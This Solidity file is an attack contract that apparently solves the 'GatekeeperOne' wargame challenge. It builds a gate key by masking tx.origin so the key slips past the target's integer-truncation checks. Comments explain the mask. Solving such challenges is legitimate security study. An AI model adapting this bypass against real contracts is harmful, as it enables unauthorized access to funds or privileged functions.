//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.6.0;

interface IGateKeeperOne {
    function enter(bytes8 _gateKey) external;
}

contract HackGateKeeperOne{
    address public owner;
    IGateKeeperOne targetContract;
    event HackGateKeeper(bytes32 message);

    constructor(address _targetAddr) public {
        targetContract = IGateKeeperOne(_targetAddr);
        owner = msg.sender;
    }
   /*
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
      require(uint32(uint64(_gateKey)) != uint64(_gateKey)
      require(uint32(uint64(_gateKey)) == uint16(tx.origin)

        input  8 Bytes

        0x11111111 = 0x1111 -> Need mask 0x0000FFFF
        0xFFFFFFFF0000FFFF
    */
    function hackContract() public {

        emit HackGateKeeper("Hacking gatekeeper");
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        targetContract.enter(key);
    }
}
